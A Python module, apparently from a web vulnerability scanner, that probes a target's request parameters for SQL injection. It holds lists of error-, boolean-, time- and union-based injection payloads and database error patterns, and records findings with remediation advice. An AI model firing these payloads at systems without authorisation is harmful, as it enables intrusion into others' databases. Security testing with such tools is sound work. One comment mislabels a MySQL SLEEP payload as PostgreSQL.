"""
SQL Injection Analyzer - SQL 注入检测模块
"""
import re
from typing import Dict, Any, List, Optional, Tuple
from .base_analyzer import BaseAnalyzer


class SQLInjectionAnalyzer(BaseAnalyzer):
    """
    SQL 注入检测分析器

    检测类型：
    1. 基于错误的 SQL 注入
    2. 基于布尔的 SQL 注入
    3. 基于时间的 SQL 注入
    4. 堆叠查询
    """

    # SQL 注入测试 payload 模板
    PAYLOADS = {
        'error_based': [
            "'",
            "'\"",
            "\"",
            "';",
            "' OR 1=1--",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1' OR '1'='1",
            "admin'--",
            "1' AND 1=1--",
            "1' AND 1=2--",
        ],
        'boolean_based': [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
        ],
        'time_based': [
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "\" AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",  # Microsoft SQL Server
            "'; SELECT SLEEP(5)--",  # PostgreSQL
        ],
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "1' UNION SELECT NULL, NULL--",
        ]
    }

    # 常见 SQL 错误匹配模式
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|PostgreSQL)",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_.*",
        r"ORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_.*",
        r"Warning.*mssql_.*",
        r"Microsoft SQL Server",
        r"SQLite3::SQLException",
        r"SQLite\.SQLException",
        r"Syntax error",
        r"Unclosed quotation mark",
        r"quoted string not properly terminated",
    ]

    def __init__(self, target: str, requester, poc_recorder,
                 llm_client=None, logger=None):
        """
        初始化 SQL 注入分析器

        Args:
            target: 目标域名或 URL
            requester: Requester 实例
            poc_recorder: PoCRecorder 实例
            llm_client: LLM 客户端实例（可选）
            logger: 日志记录器
        """
        super().__init__(target, requester, poc_recorder, llm_client, logger)
        self.vulnerabilities = []

    def analyze(self, endpoint: str, method: str = 'GET',
                params: Optional[Dict] = None,
                data: Optional[Dict] = None,
                headers: Optional[Dict] = None) -> List[Dict[str, Any]]:
        """
        分析指定端点是否存在 SQL 注入漏洞

        Args:
            endpoint: 目标端点 URL
            method: HTTP 方法
            params: URL 参数
            data: 请求体数据
            headers: 请求头

        Returns:
            发现的漏洞列表
        """
        self.log_info(f"开始分析端点: {endpoint} (方法: {method})")

        # 确定要测试的参数
        test_params = data if method != 'GET' else params
        if not test_params:
            self.log_warning("没有可测试的参数")
            return []

        # 对每个参数进行测试
        for param_name in test_params.keys():
            self.log_info(f"测试参数: {param_name}")
            self._test_parameter(endpoint, method, param_name,
                                params, data, headers)

        return self.vulnerabilities

    def _test_parameter(self, endpoint: str, method: str,
                       param_name: str, params: Optional[Dict],
                       data: Optional[Dict], headers: Optional[Dict]):
        """
        测试单个参数的 SQL 注入漏洞

        Args:
            endpoint: 目标端点 URL
            method: HTTP 方法
            param_name: 要测试的参数名
            params: URL 参数
            data: 请求体数据
            headers: 请求头
        """
        # 首先获取原始响应用于对比
        try:
            if method == 'GET':
                original_response, original_time = self.requester.get(
                    endpoint, params=params, headers=headers
                )
            else:
                original_response, original_time = self.requester.post(
                    endpoint, data=data, headers=headers
                )

            original_body = original_response.text
            original_status = original_response.status_code
        except Exception as e:
            self.log_error(f"获取原始响应失败: {str(e)}")
            return

        # 1. 测试基于错误的 SQL 注入
        error_vuln = self._test_error_based(
            endpoint, method, param_name, params, data, headers,
            original_body, original_status
        )
        if error_vuln:
            self.vulnerabilities.append(error_vuln)
            self.log_success(f"发现基于错误的 SQL 注入: 参数 {param_name}")
            return  # 发现漏洞后可以跳过其他测试

        # 2. 测试基于布尔的 SQL 注入
        boolean_vuln = self._test_boolean_based(
            endpoint, method, param_name, params, data, headers,
            original_body, original_status
        )
        if boolean_vuln:
            self.vulnerabilities.append(boolean_vuln)
            self.log_success(f"发现基于布尔的 SQL 注入: 参数 {param_name}")
            return

        # 3. 测试基于时间的 SQL 注入
        time_vuln = self._test_time_based(
            endpoint, method, param_name, params, data, headers
        )
        if time_vuln:
            self.vulnerabilities.append(time_vuln)
            self.log_success(f"发现基于时间的 SQL 注入: 参数 {param_name}")

    def _test_error_based(self, endpoint: str, method: str,
                         param_name: str, params: Optional[Dict],
                         data: Optional[Dict], headers: Optional[Dict],
                         original_body: str, original_status: int) -> Optional[Dict]:
        """
        测试基于错误的 SQL 注入

        Returns:
            如果发现漏洞，返回漏洞信息字典，否则返回 None
        """
        for payload in self.PAYLOADS['error_based']:
            response, elapsed, _ = self._send_payload(
                endpoint, method, payload, param_name,
                params, data, headers
            )

            # 检查响应中是否包含 SQL 错误
            if self._contains_sql_error(response.text):
                # 记录 POC
                return self._create_vulnerability_record(
                    endpoint, method, param_name, payload,
                    response, elapsed, 'SQL Injection (Error Based)',
                    'CRITICAL',
                    '基于错误的 SQL 注入漏洞',
                    '攻击者可以通过触发 SQL 错误获取数据库结构和敏感信息',
                    '使用参数化查询或预编译语句，对用户输入进行严格验证'
                )

        return None

    def _test_boolean_based(self, endpoint: str, method: str,
                           param_name: str, params: Optional[Dict],
                           data: Optional[Dict], headers: Optional[Dict],
                           original_body: str, original_status: int) -> Optional[Dict]:
        """
        测试基于布尔的 SQL 注入

        Returns:
            如果发现漏洞，返回漏洞信息字典，否则返回 None
        """
        # 发送 AND 1=1 (应该返回正常结果)
        payload_true = "' AND 1=1--"
        response_true, _, _ = self._send_payload(
            endpoint, method, payload_true, param_name,
            params, data, headers
        )

        # 发送 AND 1=2 (应该返回不同结果)
        payload_false = "' AND 1=2--"
        response_false, elapsed_false, _ = self._send_payload(
            endpoint, method, payload_false, param_name,
            params, data, headers
        )

        # 如果响应有显著差异，可能存在布尔注入
        if self._is_response_different(response_true.text, response_false.text):
            return self._create_vulnerability_record(
                endpoint, method, param_name, payload_false,
                response_false, elapsed_false,
                'SQL Injection (Boolean Based)',
                'HIGH',
                '基于布尔的 SQL 注入漏洞',
                '攻击者可以通过构造不同条件获取数据库中的数据',
                '使用参数化查询或预编译语句'
            )

        return None

    def _test_time_based(self, endpoint: str, method: str,
                         param_name: str, params: Optional[Dict],
                         data: Optional[Dict], headers: Optional[Dict]) -> Optional[Dict]:
        """
        测试基于时间的 SQL 注入

        Returns:
            如果发现漏洞，返回漏洞信息字典，否则返回 None
        """
        # 获取原始响应时间作为基准
        try:
            if method == 'GET':
                original_response, original_time = self.requester.get(
                    endpoint, params=params, headers=headers
                )
            else:
                original_response, original_time = self.requester.post(
                    endpoint, data=data, headers=headers
                )
        except Exception:
            return None

        for payload in self.PAYLOADS['time_based']:
            response, elapsed, _ = self._send_payload(
                endpoint, method, payload, param_name,
                params, data, headers
            )

            # 如果响应时间明显增加（考虑 5 秒延迟）
            # 阈值设置为比原始响应时间多 4 秒以上
            if elapsed > original_time + 4:
                return self._create_vulnerability_record(
                    endpoint, method, param_name, payload,
                    response, elapsed,
                    'SQL Injection (Time Based)',
                    'HIGH',
                    '基于时间的 SQL 注入漏洞',
                    '攻击者可以通过时间延迟推断数据库信息',
                    '使用参数化查询或预编译语句'
                )

        return None

    def _contains_sql_error(self, response_body: str) -> bool:
        """检查响应体是否包含 SQL 错误信息"""
        for pattern in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_body, re.IGNORECASE):
                return True
        return False

    def _is_response_different(self, body1: str, body2: str,
                              threshold: float = 0.3) -> bool:
        """
        比较两个响应体是否有显著差异

        Args:
            body1: 第一个响应体
            body2: 第二个响应体
            threshold: 差异阈值（0-1 之间）

        Returns:
            如果差异超过阈值返回 True
        """
        # 使用简单的长度和内容比较
        if not body1 or not body2:
            return False

        len1, len2 = len(body1), len(body2)

        # 如果长度差异超过阈值，认为有差异
        length_diff_ratio = abs(len1 - len2) / max(len1, len2)
        if length_diff_ratio > threshold:
            return True

        # 检查内容差异
        from difflib import SequenceMatcher
        similarity = SequenceMatcher(None, body1, body2).ratio()
        return similarity < (1 - threshold)

    def _create_vulnerability_record(self, endpoint: str, method: str,
                                     param_name: str, payload: str,
                                     response, elapsed: float,
                                     vuln_type: str, severity: str,
                                     description: str, impact: str,
                                     remediation: str) -> Dict[str, Any]:
        """
        创建漏洞记录

        Returns:
            漏洞信息字典
        """
        # 记录请求
        request_record = self.poc_recorder.record_request(
            method=method,
            url=endpoint,
            headers=dict(response.request.headers),
            body=getattr(response.request, 'body', None)
        )

        # 记录响应
        response_record = self.poc_recorder.record_response(
            status_code=response.status_code,
            headers=dict(response.headers),
            body=response.text,
            response_time=elapsed
        )

        # 创建漏洞记录
        vulnerability = {
            'type': vuln_type,
            'severity': severity,
            'endpoint': endpoint,
            'parameter': param_name,
            'description': description,
            'payload': payload,
            'request': request_record,
            'response': response_record,
            'impact': impact,
            'remediation': remediation
        }

        # 添加到 POC 记录器
        self.poc_recorder.add_vulnerability(
            vuln_type=vuln_type,
            severity=severity,
            endpoint=endpoint,
            description=f"参数 '{param_name}' 存在 {description}",
            payload=payload,
            request_record=request_record,
            response_record=response_record,
            impact=impact,
            remediation=remediation
        )

        return vulnerability
